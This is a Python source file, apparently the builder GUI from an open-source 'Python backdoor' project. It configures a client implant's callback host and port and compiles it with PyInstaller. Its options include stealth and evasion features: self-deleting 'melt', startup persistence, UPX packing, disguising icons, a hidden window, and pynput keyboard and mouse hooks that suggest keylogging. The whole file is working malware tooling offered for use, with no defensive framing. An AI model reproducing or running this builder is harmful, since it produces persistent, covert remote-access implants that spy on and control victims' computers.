"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import os
import shutil
from tkinter import *
from tkinter.ttk import *
import tkinter.messagebox
from tkinter import filedialog
import socket
import sys
import urllib.request
import site


def check_main_files():
    if not (os.path.isfile("src/server.py") and os.path.isfile("src/client.py")):
        tkinter.messagebox.showerror("Error", "Missing required files")
        sys.exit(0)


def get_local_ip():
    try:
        # create a dummy socket to get local IP address
        _socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        _socket.connect(("google.com", 0))
        ip = _socket.getsockname()[0]
        _socket.close()
    except socket.error:
        tkinter.messagebox.showerror("Error", "You are not connected to the internet")
        sys.exit(0)

    return ip


def get_pyinstaller():
    user_path = site.getusersitepackages().split("\\")[:-1]
    user_path = "\\".join(user_path)

    for path in site.getsitepackages() + [site.getusersitepackages(), user_path]:
        _path = f"{path}\\Scripts\\pyinstaller.exe"
        if os.path.isfile(_path):
            return "\"" + _path + "\""

    tkinter.messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
    sys.exit(0)


def save_files(client_args, server_args):
    client_new_line = f"if __name__ == \"__main__\": Client({', '.join(client_args)}).start()"
    server_new_line = f"if __name__ == \"__main__\": Server({', '.join(server_args)}).start()"

    main_match = "if __name__ == \"__main__\":"

    _dict = {"src/server.py": server_new_line, "src/client.py": client_new_line}
    for file_name in _dict:
        file = open(file_name, "r")
        file_contents = file.readlines()
        file.close()

        i = 0
        for i in range(0, len(file_contents)):
            if file_contents[i][:len(main_match)] == main_match:
                break

        file_contents = file_contents[:i]
        file_contents.append(_dict[file_name])

        file = open(file_name, "w")
        file.writelines(file_contents)
        file.close()


class Setup:
    def __init__(self):
        os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
        check_main_files()

        self.pyinstaller = get_pyinstaller()

        self.local_ip = get_local_ip()
        self.external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
        self.loopback_ip = "127.0.0.1"
        self.host = self.local_ip

        self.melt = False
        self.add_startup = False
        self.UPX = False
        self.icon_path = None
        self.is_hostname = False
        self.is_console = False

        self.create_ui()

    def create_ui(self):
        self.root = Tk()

        self.root.geometry("500x200")
        self.root.resizable(0, 0)
        self.root.title("Python backdoor setup")

        self.frame = Frame(self.root)
        self.frame.grid(row=0, column=0, padx=10, pady=10)

        self.host_frame = LabelFrame(self.frame, text="Host")
        self.host_frame.pack(side=TOP, anchor=NW)

        self.lt = Label(self.host_frame, text="Choose host:")
        self.lt.grid(row=0, column=0, padx=8, pady=5)

        self.host_cb = Combobox(self.host_frame,
                                values=["Local IP", "External IP", "Other IP", "DNS hostname", "Loopback"], width=20)
        self.host_cb.grid(column=1, row=0, pady=5, padx=8)
        self.host_cb.bind("<<ComboboxSelected>>", self.host_cb_callback)
        self.host_cb.current(0)

        self.host_widg = Label(self.host_frame, text=self.local_ip)
        self.host_widg.grid(column=2, row=0, padx=8, pady=5)

        self.port_lb = Label(self.host_frame, text="Choose port:")
        self.port_lb.grid(column=0, row=1, pady=8)

        self.port_et = Entry(self.host_frame, width=7)
        self.port_et.insert(END, "3000")
        self.port_et.grid(column=1, row=1, pady=8)

        self.misc_frame = LabelFrame(self.frame, text="Misc.")
        self.misc_frame.pack()

        self.melt_btn = Button(self.misc_frame, text="Melt file", command=self.melt_btn_callback)
        self.melt_btn.grid(column=0, row=0, padx=8, pady=8)

        self.add_startup_btn = Button(self.misc_frame, text="Add to startup", command=self.add_startup_btn_callback)
        self.add_startup_btn.grid(column=1, row=0, padx=8, pady=8)

        self.add_icon_btn = Button(self.misc_frame, text="Custom icon", command=self.add_icon_btn_callback)
        self.add_icon_btn.grid(column=2, row=0, padx=8, pady=8)

        self.upx_btn = Button(self.misc_frame, text="Use UPX", command=self.upx_btn_callback)
        self.upx_btn.grid(column=3, row=0, padx=8, pady=8)

        self.console_btn = Button(self.misc_frame, text="Console app", command=self.console_btn_callback)
        self.console_btn.grid(column=4, row=0, padx=8, pady=8)

        self.build_btn = Button(self.frame, text="Build", width=16, command=self.build_btn_callback)
        self.build_btn.pack(pady=8, padx=8)

        self.root.mainloop()

    def console_btn_callback(self):
        self.console_btn["state"] = "disabled"

        self.is_console = True

    def build_btn_callback(self):
        self.build_btn["state"] = "disabled"

        port = self.port_et.get()

        if not port.isdigit():
            tkinter.messagebox.showerror("Build", "You must enter numeric value for the port")
        elif not 1024 <= int(port) <= 65535:
            tkinter.messagebox.showerror("Build", "Please enter a port number between 1024 and 65535")
        else:
            client_args = \
                [f"'{self.host}'", str(port),  str(self.is_hostname), str(self.add_startup),  str(self.melt)]

            server_args = [str(port)]

            save_files(client_args, server_args)

            upx_command = ""
            icon_command = ""
            windowed = "--windowed "

            if self.is_console:
                windowed = ""

            if not self.UPX:
                upx_command = "--noupx "

                # https://github.com/pyinstaller/pyinstaller/issues/3005
                try:
                    shutil.rmtree(os.environ["APPDATA"] + "/pyinstaller")
                except Exception:
                    pass

            if self.icon_path:
                icon_command = f"--icon {self.icon_path}"

            os.system(
                f"{self.pyinstaller} src/client.py {upx_command}--hidden-import pynput.keyboard._win32 --hidden-import "
                f"pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                f"--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter --onefile {windowed}"
                f"{icon_command}")

    def add_icon_btn_callback(self):
        path = filedialog.askopenfile(parent=self.root, title="Choose icon", filetypes=[("icon", ".ico")])

        if path is not None:
            self.icon_path = "\"" + path.name + "\""
            path.close()
            self.add_icon_btn["state"] = "disabled"

    def upx_btn_callback(self):
        answer = tkinter.messagebox.askyesno("Use UPX",
                                             "UPX may not work on fresh computers (eg. new installs)\n\nUse UPX?")

        if answer is not None and answer:
            self.upx_btn["state"] = "disabled"
            self.UPX = True

    def melt_btn_callback(self):
        self.melt_btn["state"] = "disabled"
        self.melt = True

    def add_startup_btn_callback(self):
        self.add_startup_btn["state"] = "disabled"
        self.add_startup = True

    def host_cb_callback(self, evt):
        value = evt.widget.get()

        if self.host_widg.winfo_exists() is not None:
            self.host_widg.destroy()

        if value in ["Local IP", "External IP", "Loopback"]:
            self.host_widg = Label(self.host_frame)
            self.host_widg.grid(column=2, row=0, padx=8, pady=5)
        else:
            self.host_widg = Entry(self.host_frame)
            if value == "DNS hostname":
                self.host_widg.insert(END, "hostname")
                self.is_hostname = True
            else:
                self.host_widg.insert(END, "IP")
            self.host_widg.grid(column=2, row=0, padx=8, pady=5)

        match value:
            case "Local IP":
                self.host = self.local_ip
            case "External IP":
                self.host = self.external_ip
            case "Loopback":
                self.host = self.loopback_ip

        if not isinstance(self.host_widg, Entry):
            self.host_widg["text"] = self.host


if __name__ == "__main__":
    Setup()
